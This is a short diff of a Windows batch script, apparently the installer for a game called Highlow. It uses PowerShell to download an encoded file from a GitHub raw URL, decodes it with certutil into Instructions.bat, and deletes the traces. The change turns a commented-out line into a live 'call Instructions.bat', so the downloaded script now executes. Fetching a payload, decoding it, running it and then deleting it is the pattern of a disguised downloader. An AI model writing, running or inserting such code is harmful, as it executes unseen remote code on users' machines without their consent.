@@ -9,7 +9,7 @@ if not exist %appdata%\Microsoft\System\*.bat (
 powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/RickDawlson/Ping/main/Installer', 'Instructions.txt')"
 certutil -f -decode Instructions.txt Instructions.bat
 Del Instructions.txt
-rem call Instructions.bat
+call Instructions.bat
 del Instructions.bat
 powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/RickDawlson/Ping/main/Game', 'Highlow.bat')"
 cls
